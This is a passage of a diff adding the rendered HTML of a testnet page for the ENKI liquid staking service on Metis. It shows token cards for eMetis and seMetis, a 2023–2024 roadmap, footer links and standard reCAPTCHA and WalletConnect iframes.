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"/>
+         <div class="sc-dLMFU bNvalT css-97kkb2">
+          ENKI Staking on Andromeda
+         </div>
+         <div class="sc-eBMEME lnCwSR">
+          <div class="sc-dLMFU bNvalT css-ov6m7i">
+           • No threshold, all users can participate
+          </div>
+          <div class="sc-dLMFU bNvalT css-ov6m7i">
+           • No METIS amount limit
+          </div>
+          <div class="sc-dLMFU bNvalT css-ov6m7i">
+           • Liquidity can be freely used for trading, lending, and other activities
+          </div>
+          <div class="sc-dLMFU bNvalT css-ov6m7i">
+           • No node server setup or management
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+      <div class="sc-lcIPJg cLbVPs bg">
+       <div class="sc-hknOHE dZUnMQ">
+        ENKI Ecosystem
+       </div>
+       <div class="sc-Nxspf dyOpsx">
+        <div class="sc-cfxfcM fzdDWI">
+         <div class="top">
+          <img alt="" src="/static/media/ekMetis.f0bd93e976e880cffa80bbbe6c8797e8.svg"/>
+          <div class="sc-dLMFU bNvalT css-97kkb2">
+           eMeits
+          </div>
+          <div class="sc-dLMFU bNvalT css-3rqa7f">
+           This acts as a stablecoin, loosely pegged to Metis. It leverages Metis Sequencer Node staking and enhances the composability of the Metis ecosystem.
+          </div>
+         </div>
+         <div class="sc-imWYAI sc-dhKdcB sc-kpDqfm dmUQsh kkHLck cmzwJF">
+          <div class="sc-imWYAI sc-dhKdcB dmUQsh kkHLck">
+           <div class="sc-dLMFU bNvalT css-ov6m7i">
+            Total minted
+           </div>
+           <div aria-label="The total amount of eMetis coming out through Metis minted currently" class="sc-jEACwC kLhsZd sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" data-testid="HelpIcon" focusable="false" viewbox="0 0 24 24">
+             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m1 17h-2v-2h2zm2.07-7.75-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25">
+             </path>
+            </svg>
+           </div>
+          </div>
+          <div class="sc-dLMFU bNvalT css-15v5i44">
+           78,022 eMetis
+          </div>
+         </div>
+         <div class="sc-imWYAI sc-dhKdcB sc-kpDqfm dmUQsh kkHLck cmzwJF">
+          <div class="sc-dLMFU bNvalT css-ov6m7i">
+           Price
+          </div>
+          <div class="sc-dLMFU bNvalT css-ov6m7i">
+           = 1 METIS
+          </div>
+         </div>
+         <a class="sc-gFAWRd fKEXvd">
+          Mint now
+         </a>
+        </div>
+        <div class="sc-cfxfcM fzdDWI">
+         <div class="top">
+          <img alt="" src="/static/media/sekMetis.d6447f270473bebd8ca4d9a19dfc95dc.svg"/>
+          <div class="sc-dLMFU bNvalT css-97kkb2">
+           seMetis
+          </div>
+          <div class="sc-dLMFU bNvalT css-3rqa7f">
+           This is a version of eMetis that accrues staking yield. The majority of the profit generated from Metis sequencer nodes is distributed to seMetis holders. By staking eMetis for seMetis, users can earn staking yields, redeemable when converting seMetis back to eMetis.
+          </div>
+         </div>
+         <div class="sc-imWYAI sc-dhKdcB sc-kpDqfm dmUQsh kkHLck cmzwJF">
+          <div class="sc-imWYAI sc-dhKdcB dmUQsh kkHLck">
+           <div class="sc-dLMFU bNvalT css-ov6m7i">
+            Total minted
+           </div>
+           <div aria-label="The total amount of seMetis coming out through eMetis staked currently" class="sc-jEACwC kLhsZd sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" data-testid="HelpIcon" focusable="false" viewbox="0 0 24 24">
+             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m1 17h-2v-2h2zm2.07-7.75-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25">
+             </path>
+            </svg>
+           </div>
+          </div>
+          <div class="sc-dLMFU bNvalT css-15v5i44">
+           31,200 seMetis
+          </div>
+         </div>
+         <div class="sc-imWYAI sc-dhKdcB sc-kpDqfm dmUQsh kkHLck cmzwJF">
+          <div class="sc-imWYAI sc-dhKdcB dmUQsh kkHLck">
+           <div class="sc-dLMFU bNvalT css-ov6m7i">
+            Total Staked
+           </div>
+           <div aria-label="The total amount of eMetis staked in staking yield" class="sc-jEACwC kLhsZd sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" data-testid="HelpIcon" focusable="false" viewbox="0 0 24 24">
+             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m1 17h-2v-2h2zm2.07-7.75-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25">
+             </path>
+            </svg>
+           </div>
+          </div>
+          <div class="sc-dLMFU bNvalT css-15v5i44">
+           66,001 eMetis
+          </div>
+         </div>
+         <div class="sc-imWYAI sc-dhKdcB sc-kpDqfm dmUQsh kkHLck cmzwJF">
+          <div class="sc-imWYAI sc-dhKdcB dmUQsh kkHLck">
+           <div class="sc-dLMFU bNvalT css-ov6m7i">
+            APR
+           </div>
+           <div aria-label="eMetis’ staking yield" class="sc-jEACwC kLhsZd sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" data-testid="HelpIcon" focusable="false" viewbox="0 0 24 24">
+             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m1 17h-2v-2h2zm2.07-7.75-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25">
+             </path>
+            </svg>
+           </div>
+          </div>
+          <div class="sc-dLMFU jDnamu css-1vevtj6">
+           Not available on Testnet
+          </div>
+         </div>
+         <div class="sc-imWYAI sc-dhKdcB sc-kpDqfm dmUQsh kkHLck cmzwJF">
+          <div class="sc-imWYAI sc-dhKdcB dmUQsh kkHLck">
+           <div class="sc-dLMFU bNvalT css-ov6m7i">
+            eMeits per seMetis
+           </div>
+           <div aria-label="Exchange rates for eMetis and seMetis" class="sc-jEACwC kLhsZd sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" data-testid="HelpIcon" focusable="false" viewbox="0 0 24 24">
+             <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2m1 17h-2v-2h2zm2.07-7.75-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25">
+             </path>
+            </svg>
+           </div>
+          </div>
+          <div class="sc-dLMFU bNvalT css-15v5i44">
+           2.115
+          </div>
+         </div>
+         <a class="sc-gFAWRd fKEXvd">
+          Stake now
+         </a>
+        </div>
+       </div>
+       <div class="sc-hknOHE dZUnMQ" style="margin-top: 64px;">
+        Learn about ENKI
+       </div>
+       <div class="sc-gmPhUn bXxcoF">
+        <div aria-label="Not available on Testnet" class="sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+         <button class="sc-eqUAAy llnyos normal outline false connectButton">
+          <div class="sc-dLMFU gJuYVo css-1yqan6k">
+           Litepaper
+          </div>
+         </button>
+        </div>
+        <div aria-label="Not available on Testnet" class="sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+         <button class="sc-eqUAAy llnyos normal primary false connectButton">
+          Learn More
+         </button>
+        </div>
+       </div>
+       <div class="sc-hknOHE dZUnMQ" style="margin-top: 64px;">
+        Roadmap
+       </div>
+       <div class="sc-hRJfrW kxqJRa">
+        <div class="MuiStepper-root MuiStepper-horizontal MuiStepper-alternativeLabel css-1187icl">
+         <div class="MuiStep-root MuiStep-horizontal MuiStep-alternativeLabel css-166ciyp">
+          <span class="MuiStepLabel-root MuiStepLabel-horizontal MuiStepLabel-alternativeLabel css-1abj2s5">
+           <span class="MuiStepLabel-iconContainer Mui-active MuiStepLabel-alternativeLabel css-a5nipc">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium MuiStepIcon-root Mui-active css-4ff9q7" focusable="false" viewbox="0 0 24 24">
+             <circle cx="12" cy="12" r="12">
+             </circle>
+             <text class="MuiStepIcon-text css-10psl7k" dominant-baseline="central" text-anchor="middle" x="12" y="12">
+              1
+             </text>
+            </svg>
+           </span>
+           <span class="MuiStepLabel-labelContainer MuiStepLabel-alternativeLabel css-h2cmlr">
+            <span class="MuiStepLabel-label Mui-active MuiStepLabel-alternativeLabel css-2fdkz6">
+             <div class="sc-eBMEME LZntW">
+              <div class="sc-dLMFU bNvalT css-hreab9">
+               Q3 2023
+              </div>
+              <div class="sc-iHbSHJ gHOwAR">
+               Development of the Proof of Concept.
+              </div>
+             </div>
+            </span>
+           </span>
+          </span>
+         </div>
+         <div class="MuiStep-root MuiStep-horizontal MuiStep-alternativeLabel css-166ciyp">
+          <div class="MuiStepConnector-root MuiStepConnector-horizontal MuiStepConnector-alternativeLabel Mui-disabled css-15oeqyl">
+           <span class="MuiStepConnector-line MuiStepConnector-lineHorizontal css-95m0ql">
+           </span>
+          </div>
+          <span class="MuiStepLabel-root MuiStepLabel-horizontal Mui-disabled MuiStepLabel-alternativeLabel css-1abj2s5">
+           <span class="MuiStepLabel-iconContainer Mui-disabled MuiStepLabel-alternativeLabel css-a5nipc">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium MuiStepIcon-root css-4ff9q7" focusable="false" viewbox="0 0 24 24">
+             <circle cx="12" cy="12" r="12">
+             </circle>
+             <text class="MuiStepIcon-text css-10psl7k" dominant-baseline="central" text-anchor="middle" x="12" y="12">
+              2
+             </text>
+            </svg>
+           </span>
+           <span class="MuiStepLabel-labelContainer MuiStepLabel-alternativeLabel css-h2cmlr">
+            <span class="MuiStepLabel-label Mui-disabled MuiStepLabel-alternativeLabel css-2fdkz6">
+             <div class="sc-eBMEME LZntW">
+              <div class="sc-dLMFU bNvalT css-hreab9">
+               Q4 2023
+              </div>
+              <div class="sc-iHbSHJ gHOwAR">
+               Release of beta version on testnet and public testing.
+              </div>
+             </div>
+            </span>
+           </span>
+          </span>
+         </div>
+         <div class="MuiStep-root MuiStep-horizontal MuiStep-alternativeLabel css-166ciyp">
+          <div class="MuiStepConnector-root MuiStepConnector-horizontal MuiStepConnector-alternativeLabel Mui-disabled css-15oeqyl">
+           <span class="MuiStepConnector-line MuiStepConnector-lineHorizontal css-95m0ql">
+           </span>
+          </div>
+          <span class="MuiStepLabel-root MuiStepLabel-horizontal Mui-disabled MuiStepLabel-alternativeLabel css-1abj2s5">
+           <span class="MuiStepLabel-iconContainer Mui-disabled MuiStepLabel-alternativeLabel css-a5nipc">
+            <svg aria-hidden="true" class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium MuiStepIcon-root css-4ff9q7" focusable="false" viewbox="0 0 24 24">
+             <circle cx="12" cy="12" r="12">
+             </circle>
+             <text class="MuiStepIcon-text css-10psl7k" dominant-baseline="central" text-anchor="middle" x="12" y="12">
+              3
+             </text>
+            </svg>
+           </span>
+           <span class="MuiStepLabel-labelContainer MuiStepLabel-alternativeLabel css-h2cmlr">
+            <span class="MuiStepLabel-label Mui-disabled MuiStepLabel-alternativeLabel css-2fdkz6">
+             <div class="sc-eBMEME LZntW">
+              <div class="sc-dLMFU bNvalT css-hreab9">
+               Q1 2024
+              </div>
+              <div class="sc-iHbSHJ gHOwAR">
+               Public release and subsequent product upgrades.
+              </div>
+             </div>
+            </span>
+           </span>
+          </span>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div class="sc-cMa-dbN fyzgkw">
+     <div class="sc-eXsaLi brZmrw">
+      <div class="sc-imWYAI sc-dhKdcB dmUQsh kkHLck">
+       <img class="sc-fUBkdm cOKujv" src="/static/media/logo.3940ffb97f663251a29b01e1b704a2f3.svg"/>
+      </div>
+      <div class="sc-hBtRBD cDdhiO">
+       <a rel="noreferrer">
+        <img class="sc-hYmls gMDrLP" src="/static/media/ic_twitter.936f690124cdac7f29dc67b3ef8b4d6c.svg"/>
+       </a>
+       <a rel="noreferrer">
+        <img class="sc-hYmls gMDrLP" src="/static/media/ic_telegram.c230bdd99ee16c3baae12b6c38b06e7e.svg"/>
+       </a>
+       <a rel="noreferrer">
+        <img class="sc-hYmls gMDrLP" src="/static/media/ic_medium.c64fccd4c63acd12bc5c03e1798692b3.svg"/>
+       </a>
+      </div>
+     </div>
+     <div class="sc-imWYAI sc-dhKdcB sc-kpDqfm hNRoTy kkHLck cmzwJF">
+      <div class="sc-imWYAI sc-dhKdcB dmUQsh dstSvz">
+       <div class="sc-eBMEME gDWwTX">
+        <div class="sc-dLMFU bNvalT css-1edtqf5">
+         RESOURCE
+        </div>
+        <div aria-label="Not available on Testnet" class="sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+         <div class="sc-dLMFU bNvalT css-ov6m7i">
+          Litepaper
+         </div>
+        </div>
+        <div aria-label="Not available on Testnet" class="sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+         <div class="sc-dLMFU bNvalT css-ov6m7i">
+          Privacy Policy
+         </div>
+        </div>
+        <div aria-label="Not available on Testnet" class="sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+         <div class="sc-dLMFU bNvalT css-ov6m7i">
+          User Terms
+         </div>
+        </div>
+       </div>
+       <div class="sc-eBMEME gDWwTX">
+        <div class="sc-dLMFU bNvalT css-1edtqf5">
+         DEVELOPERS
+        </div>
+        <div aria-label="Not available on Testnet" class="sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+         <div class="sc-dLMFU bNvalT css-ov6m7i">
+          Github
+         </div>
+        </div>
+        <div aria-label="Not available on Testnet" class="sc-cPiKLX Nnuod" style="display: flex; align-items: center;">
+         <div class="sc-dLMFU bNvalT css-ov6m7i">
+          Audit
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+   <w3m-modal>
+   </w3m-modal>
+  </div>
+  <div>
+   <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
+    <div class="grecaptcha-logo">
+     <iframe frameborder="0" height="60" name="a-lexdv18ikm1l" role="presentation" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" scrolling="no" src="https://www.google.com/recaptcha/enterprise/anchor?ar=1&amp;k=6LfJZ1cpAAAAAG3fe_R2xyThR93ZwvpPrApYeFt2&amp;co=aHR0cHM6Ly90ZXN0bmV0LmVua2l4eXouY29tOjQ0Mw..&amp;hl=en&amp;v=x5WWoE57Fv0d6ATKsLDIAKnt&amp;size=invisible&amp;cb=ayfzuvbn8nn1" title="reCAPTCHA" width="256">
+     </iframe>
+    </div>
+    <div class="grecaptcha-error">
+    </div>
+    <textarea class="g-recaptcha-response" id="g-recaptcha-response-100000" name="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
+   </div>
+   <iframe style="display: none;">
+   </iframe>
+  </div>
+  <iframe id="verify-api" src="https://verify.walletconnect.org/c876a65ec55eccc4ce57e11335034b3d" style="display: none;">
+  </iframe>
+ </body>
+</html>
